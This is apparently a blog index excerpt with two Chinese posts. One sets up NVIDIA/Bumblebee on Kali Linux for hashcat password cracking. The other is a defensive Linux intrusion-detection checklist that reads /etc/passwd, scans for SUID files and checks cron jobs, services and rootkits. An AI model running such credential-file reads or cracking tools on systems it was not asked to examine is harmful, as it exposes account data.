    <content type="html"><![CDATA[<h2 id="查看主机是否存在nvidia显卡"><a href="#查看主机是否存在nvidia显卡" class="headerlink" title="查看主机是否存在nvidia显卡"></a>查看主机是否存在nvidia显卡</h2><pre><code class="hljs 1c">lspci -k <span class="hljs-string">| grep -A 2 -E "</span>(VGA<span class="hljs-string">|3D)"</span></code></pre><blockquote><p>00:02.0 VGA compatible controller: Intel Corporation 3rd Gen Core processor Graphics Controller (rev 09)<br>    Subsystem: Lenovo 3rd Gen Core processor Graphics Controller<br>    Kernel driver in use: i915</p></blockquote><blockquote><p>01:00.0 3D controller: NVIDIA Corporation GK208M [GeForce GT 740M] (rev a1)<br>    Subsystem: Lenovo GK208M [GeForce GT 740M]<br>    Kernel driver in use: nvidia</p></blockquote><h2 id="更新系统并重启"><a href="#更新系统并重启" class="headerlink" title="更新系统并重启"></a>更新系统并重启</h2><pre><code class="hljs sas">apt <span class="hljs-meta">update</span> <span class="hljs-variable">&amp;&amp;</span> apt dist-upgrade -yreboot</code></pre><h2 id="禁用nvidia开源驱动nouveau"><a href="#禁用nvidia开源驱动nouveau" class="headerlink" title="禁用nvidia开源驱动nouveau"></a>禁用nvidia开源驱动nouveau</h2><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/modprobe.d/blacklist-libnfc.<span class="hljs-keyword">conf</span></code></pre><p>在<strong>blacklist-libnfc.conf</strong>最后添加</p><pre><code class="hljs properties"><span class="hljs-attr">blacklist</span> <span class="hljs-string">nouveau</span><span class="hljs-attr">options</span> <span class="hljs-string">nouveau modeset=0</span></code></pre><h2 id="安装-linux-headers"><a href="#安装-linux-headers" class="headerlink" title="安装 linux-headers"></a>安装 linux-headers</h2><pre><code class="hljs reasonml">apt install linux-headers-<span class="hljs-constructor">$(<span class="hljs-params">uname</span> -<span class="hljs-params">r</span>)</span></code></pre><h2 id="安装nvidia驱动"><a href="#安装nvidia驱动" class="headerlink" title="安装nvidia驱动"></a>安装nvidia驱动</h2><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install nvidia-kernel-dkms nvidia-cuda-toolkit nvidia-driver</code></pre><h2 id="安装bumblebee-primus"><a href="#安装bumblebee-primus" class="headerlink" title="安装bumblebee primus"></a>安装bumblebee primus</h2><blockquote><p>“Bumblebee 致力于使 NVIDIA Optimus 在 GNU/Linux 系统上可用，实现两块不同的供电配置的显卡同时插入使用，共享同一个 framebuffer。” </p></blockquote><pre><code class="hljs mipsasm">apt <span class="hljs-keyword">install </span><span class="hljs-keyword">bumblebee-nvidia </span>primus</code></pre><p>开机自启动bumblebee服务</p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">systemctl <span class="hljs-built_in">enable</span> bumblebeed</span></code></pre><p>添加当前用户到bumblebee组</p><pre><code class="hljs armasm"><span class="hljs-keyword">adduser </span>root <span class="hljs-keyword">bumblebee</span></code></pre><p>改变以下 bumblebee.conf 设置:</p><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/bumblebee/bumblebee.<span class="hljs-keyword">conf</span></code></pre><pre><code class="hljs ini"><span class="hljs-attr">KeepUnusedXServer</span>=<span class="hljs-literal">true</span><span class="hljs-attr">Driver</span>=nvidia</code></pre><p>接下来修改 vim /etc/bumblebee/xorg.conf.nvidia<br>下面这条指令可以获取显卡的总线的ID</p><pre><code class="hljs 1c">lspci -k <span class="hljs-string">| grep -A 2 -E "</span>(VGA<span class="hljs-string">|3D)"</span></code></pre><blockquote><p>00:02.0 VGA compatible controller: Intel Corporation 3rd Gen Core processor Graphics Controller (rev 09)<br>    Subsystem: Lenovo 3rd Gen Core processor Graphics Controller<br>    Kernel driver in use: i915</p></blockquote><blockquote><p>01:00.0 3D controller: NVIDIA Corporation GK208M [GeForce GT 740M] (rev a1)<br>    Subsystem: Lenovo GK208M [GeForce GT 740M]<br>    Kernel driver in use: nvidia</p></blockquote><p>我的笔记本nvidia的总线ID为01:00.0</p><pre><code class="hljs cmake">Section <span class="hljs-string">"ServerLayout"</span>     Identifier  <span class="hljs-string">"Layout0"</span>     <span class="hljs-keyword">Option</span>      <span class="hljs-string">"AutoAddDevices"</span> <span class="hljs-string">"false"</span>     <span class="hljs-keyword">Option</span>      <span class="hljs-string">"AutoAddGPU"</span> <span class="hljs-string">"false"</span> EndSection Section <span class="hljs-string">"Device"</span>     Identifier  <span class="hljs-string">"DiscreteNvidia"</span>     Driver      <span class="hljs-string">"nvidia"</span>     VendorName  <span class="hljs-string">"NVIDIA Corporation"</span>  <span class="hljs-comment">#  If the X server does not automatically detect your VGA device, </span><span class="hljs-comment">#  you can manually set it here. </span><span class="hljs-comment">#  To get the BusID prop, run `lspci | egrep 'VGA|3D'` and input the data </span><span class="hljs-comment">#  as you see in the commented example. </span><span class="hljs-comment">#  This Setting may be needed in some platforms with more than one </span><span class="hljs-comment">#  nvidia card, which may confuse the proprietary driver (e.g., </span><span class="hljs-comment">#  trying to take ownership of the wrong device). Also needed on Ubuntu 13.04. </span>    BusID <span class="hljs-string">"PCI:01:00:0"</span>  <span class="hljs-comment">#  Setting ProbeAllGpus to false prevents the new proprietary driver </span><span class="hljs-comment">#  instance spawned to try to control the integrated graphics card, </span><span class="hljs-comment">#  which is already being managed outside bumblebee. </span><span class="hljs-comment">#  This option doesn't hurt and it is required on platforms running </span><span class="hljs-comment">#  more than one nvidia graphics card with the proprietary driver. </span><span class="hljs-comment">#  (E.g. Macbook Pro pre-2010 with nVidia 9400M + 9600M GT). </span><span class="hljs-comment">#  If this option is not set, the new Xorg may blacken the screen and </span><span class="hljs-comment">#  render it unusable (unless you have some way to run killall Xorg). </span>    <span class="hljs-keyword">Option</span> <span class="hljs-string">"ProbeAllGpus"</span> <span class="hljs-string">"false"</span>      <span class="hljs-keyword">Option</span> <span class="hljs-string">"NoLogo"</span> <span class="hljs-string">"true"</span>     <span class="hljs-keyword">Option</span> <span class="hljs-string">"UseEDID"</span> <span class="hljs-string">"false"</span>     <span class="hljs-keyword">Option</span> <span class="hljs-string">"UseDisplayDevice"</span> <span class="hljs-string">"none"</span> EndSection</code></pre><p>把BusID这一行的注释去掉,修改里面的PCI号(你获取到独显BUSID号码),值得注意的是,获取到的ID号最后一位必须为冒号.</p><p>也就是<strong>PCI:01:00:0</strong></p><h2 id="重启检测驱动是否安装成功"><a href="#重启检测驱动是否安装成功" class="headerlink" title="重启检测驱动是否安装成功"></a>重启检测驱动是否安装成功</h2><p>我这里主要使用hashcat破解密码，这里使用hashcat测试nvidia驱动是否安装成功</p><pre><code class="hljs ebnf"><span class="hljs-attribute">hashcat -I</span></code></pre><p>也可以安装 <strong>mesa-demos</strong> 并使用 <strong>glxgears</strong> 测试 <strong>Bumblebee</strong> 是否工作：</p><pre><code class="hljs armasm">$ optirun glxgears -<span class="hljs-meta">info</span></code></pre><p>如果失败，尝试下列命令:<br>64位系统:</p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>optirun glxspheres64</code></pre><p>32位系统:</p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>optirun glxspheres32</code></pre><p>如果一个内有动画的窗口出现，那么 Optimus 和 Bumblebee 正在工作。 </p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 入侵检测</title>
    <link href="/2017/08/31/2017-08-31-linux-intrusion-detection/"/>
    <url>/2017/08/31/2017-08-31-linux-intrusion-detection/</url>
    
    <content type="html"><![CDATA[<h2 id="检查系统日志"><a href="#检查系统日志" class="headerlink" title="检查系统日志"></a>检查系统日志</h2><h3 id="检查系统错误登陆日志，统计IP重试次数"><a href="#检查系统错误登陆日志，统计IP重试次数" class="headerlink" title="检查系统错误登陆日志，统计IP重试次数"></a>检查系统错误登陆日志，统计IP重试次数</h3><p>这里使用了lastb命令，该命令需要root权限，可以显示所有登陆信息。这里仅仅显示的root用户的，读者可以更具实际情况自行确定，或者直接全部都显示，你会有不一样的收获，每个人的脚本都不一样，更具实际情况自行编写。</p><pre><code class="hljs coq"># lastb root | <span class="hljs-type">awk</span> '&#123;print $<span class="hljs-number">3</span>&#125;' | <span class="hljs-type">sort</span> | <span class="hljs-type">uniq</span> -c | <span class="hljs-type">sort</span> -nr| <span class="hljs-type">more</span></code></pre><p>以下是我部署在阿里云上主机被多次扫描的日志</p><blockquote><p>isadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:56 - 23:56  (00:00)<br>deploy   ssh:notty    121.42.165.44    Mon Aug  7 23:54 - 23:54  (00:00)<br>deploy   ssh:notty    121.42.165.44    Mon Aug  7 23:54 - 23:54  (00:00)<br>vagrant  ssh:notty    121.42.165.44    Mon Aug  7 23:51 - 23:51  (00:00)<br>vagrant  ssh:notty    121.42.165.44    Mon Aug  7 23:51 - 23:51  (00:00)<br>Iqadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:47 - 23:47  (00:00)<br>Iqadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:47 - 23:47  (00:00)<br>debian   ssh:notty    121.42.165.44    Mon Aug  7 23:45 - 23:45  (00:00)<br>debian   ssh:notty    121.42.165.44    Mon Aug  7 23:45 - 23:45  (00:00)<br>gpadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:43 - 23:43  (00:00)<br>gpadmin  ssh:notty    121.42.165.44    Mon Aug  7 23:43 - 23:43  (00:00)<br>oracle   ssh:notty    121.42.165.44    Mon Aug  7 23:40 - 23:40  (00:00)<br>oracle   ssh:notty    121.42.165.44    Mon Aug  7 23:40 - 23:40  (00:00)<br>tomovic  ssh:notty    121.42.165.44    Mon Aug  7 23:38 - 23:38  (00:00)<br>tomovic  ssh:notty    121.42.165.44    Mon Aug  7 23:38 - 23:38  (00:00)<br>nginx    ssh:notty    185.56.146.16    Mon Aug  7 23:37 - 23:37  (00:00)<br>nginx    ssh:notty    185.56.146.16    Mon Aug  7 23:36 - 23:36  (00:00)<br>root     ssh:notty    121.42.165.44    Mon Aug  7 23:36 - 23:36  (00:00)<br>root     ssh:notty    121.42.165.44    Mon Aug  7 23:34 - 23:34  (00:00)<br>aaa      ssh:notty    121.42.165.44    Mon Aug  7 23:12 - 23:12  (00:00)<br>aaa      ssh:notty    121.42.165.44    Mon Aug  7 23:12 - 23:12  (00:00) ‘</p></blockquote><p>通过检测，我们可以发现可以得到该恶意ip，然后添加到过滤名单中</p><blockquote><p>[root@sanduo ~]#  lastb root | awk ‘{print $3}’ | sort | uniq -c | sort -nr| more<br>     78 218.244.128.200<br>     32 140.205.225.199<br>     32 140.205.201.37<br>     24 140.205.201.32<br>     22 140.205.225.188<br>     22 140.205.201.42<br>     16 140.205.225.204<br>     16 140.205.225.201<br>     16 140.205.225.200<br>     16 140.205.225.193<br>     16 140.205.225.186<br>     16 140.205.225.183<br>     16 140.205.201.30<br>     12 129.144.188.171</p></blockquote><h2 id="检查系统用户"><a href="#检查系统用户" class="headerlink" title="检查系统用户"></a>检查系统用户</h2><pre><code class="hljs stata">1、<span class="hljs-keyword">cat</span> /etc/passwd 查看是否有异常的系统用户2、grep “0” /etc/passwd 查看是否产生了新用户，UID和GID为0的用户3、<span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> /etc/passwd 查看passwd的修改时间，判断是否在不知的情况下添加用户4、查看是否存在特权用户 awk -F<span class="hljs-string">":"</span> '&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$3</span> == 0)&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#125;' /etc/passwd5、查看是否存在空口令帐户 awk -F: '&#123;<span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(<span class="hljs-variable">$2</span>)==0) &#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1&#125;</span>&#125;' /etc/passwd</code></pre><h2 id="检查系统异常进程"><a href="#检查系统异常进程" class="headerlink" title="检查系统异常进程"></a>检查系统异常进程</h2><blockquote><p>1、注意UID为0的进程 使用ps -ef命令查看进程<br>2、察看该进程所打开的端口和文件 lsof -p pid命令查看<br>3、检查隐藏进程<br>“linux即文件，所有的进程在/proc均有记录，需要注意，这里的信息是最详细的，一些系统指令可能会出现被替换的的问题。”</p></blockquote><pre><code class="hljs coq"># ps -ef | <span class="hljs-type">awk</span> '&#123;print $<span class="hljs-number">2</span>&#125;'| <span class="hljs-type">sort</span> -n | <span class="hljs-type">uniq</span> &gt;<span class="hljs-number">1</span> ls /proc |<span class="hljs-type">sort</span> -n|<span class="hljs-type">uniq</span> &gt;<span class="hljs-number">2</span> diff <span class="hljs-number">1</span> <span class="hljs-number">2</span></code></pre><h2 id="检查系统异常文件"><a href="#检查系统异常文件" class="headerlink" title="检查系统异常文件"></a>检查系统异常文件</h2><pre><code class="hljs dos"># <span class="hljs-built_in">find</span> / -uid <span class="hljs-number">0</span> -perm <span class="hljs-number">4000</span> -<span class="hljs-built_in">print</span># <span class="hljs-built_in">find</span> / -size +<span class="hljs-number">10000</span>k –<span class="hljs-built_in">print</span># <span class="hljs-built_in">find</span> / -name “…” –<span class="hljs-built_in">print</span># <span class="hljs-built_in">find</span> / -name “.. ” –<span class="hljs-built_in">print</span># <span class="hljs-built_in">find</span> / -name “. ” –<span class="hljs-built_in">print</span># <span class="hljs-built_in">find</span> / -name ” ” –<span class="hljs-built_in">print</span></code></pre><blockquote><ul><li>注意SUID文件，可疑大于10M和空格文件</li></ul></blockquote><pre><code class="hljs mel"># find / -name core -<span class="hljs-keyword">exec</span> <span class="hljs-keyword">ls</span> -l &#123;&#125; \ （检查系统中的core文件）</code></pre><blockquote><p>find -perm 高级用法</p></blockquote><pre><code>-perm mode:文件许可正好符合mode-perm +mode:文件许可部分符合mode-perm -mode: 文件许可完全符合mode</code></pre><h2 id="检查系统文件的完整性"><a href="#检查系统文件的完整性" class="headerlink" title="检查系统文件的完整性"></a>检查系统文件的完整性</h2><pre><code class="hljs vala"><span class="hljs-meta"># rpm –qf /bin/ls</span><span class="hljs-meta"># rpm -qf /bin/login</span><span class="hljs-meta"># md5sum –b 文件名</span><span class="hljs-meta"># md5sum –t 文件名</span></code></pre><h2 id="检查系统安装包的完整性（这里主要检验的rpm包）"><a href="#检查系统安装包的完整性（这里主要检验的rpm包）" class="headerlink" title="检查系统安装包的完整性（这里主要检验的rpm包）"></a>检查系统安装包的完整性（这里主要检验的rpm包）</h2><pre><code class="hljs routeros"><span class="hljs-comment"># rpm –Va 输出格式：</span>S – File size differsM – Mode differs (permissions)5 – MD5 sum differsD – Device number mismatchL – readLink path mismatchU –<span class="hljs-built_in"> user </span>ownership differsG –<span class="hljs-built_in"> group </span>ownership differsT – modification time differs注意相关的 /sbin, /bin, /usr/sbin, <span class="hljs-keyword">and</span> /usr/bin</code></pre><blockquote><p>对于不同的linux系统，你需要根据实际情况进行检查。</p></blockquote><h2 id="检查网络"><a href="#检查网络" class="headerlink" title="检查网络"></a>检查网络</h2><pre><code class="hljs vala"><span class="hljs-meta"># ip link | grep PROMISC（正常网卡不该在promisc混杂模式，可能存在sniffer）</span>网卡处于混杂模式，这样通过网卡的流量都会被监听<span class="hljs-meta"># lsof –i 如查看所有打开80端口的进程： lsof –i :80</span>查看恶意程序开放的端口<span class="hljs-meta"># netstat –nap（察看不正常打开的TCP/UDP端口)</span><span class="hljs-meta"># arp –a 查看流量在内网是否被劫持</span></code></pre><h2 id="检查系统计划任务"><a href="#检查系统计划任务" class="headerlink" title="检查系统计划任务"></a>检查系统计划任务</h2><blockquote><ul><li>注意root和UID是0的schedule</li></ul></blockquote><pre><code class="hljs vala"><span class="hljs-meta"># crontab –u root –l</span><span class="hljs-meta"># cat /etc/crontab</span><span class="hljs-meta"># ls /etc/cron.*</span></code></pre><h2 id="检查系统后门"><a href="#检查系统后门" class="headerlink" title="检查系统后门"></a>检查系统后门</h2><pre><code class="hljs vala"><span class="hljs-meta"># cat /etc/crontab</span><span class="hljs-meta"># ls /var/spool/cron/</span><span class="hljs-meta"># cat /etc/rc.d/rc.local</span><span class="hljs-meta"># ls /etc/rc.d # ls /etc/rc3.d</span><span class="hljs-meta"># find / -type f -perm 4000</span></code></pre><h2 id="检查系统服务"><a href="#检查系统服务" class="headerlink" title="检查系统服务"></a>检查系统服务</h2><pre><code class="hljs vala"><span class="hljs-meta"># chkconfig —list</span><span class="hljs-meta"># rpcinfo -p（查看RPC服务）</span></code></pre><p>这个主要检测的是启动服务，目前在centos7以上都采用systemd 来管理相应的服务。Systemd是一个系统管理守护进程、工具和库的集合，用于取代System V初始进程。Systemd的功能是用于集中管理和配置类UNIX系统。</p><pre><code class="hljs ocaml">查看所有的可用单元# systemctl <span class="hljs-built_in">list</span>-<span class="hljs-built_in">unit</span>-files</code></pre><h2 id="检查rootkit"><a href="#检查rootkit" class="headerlink" title="检查rootkit"></a>检查rootkit</h2><pre><code class="hljs vala"><span class="hljs-meta"># rkhunter -c</span><span class="hljs-meta"># chkrootkit -q</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>Operations</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Operations</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
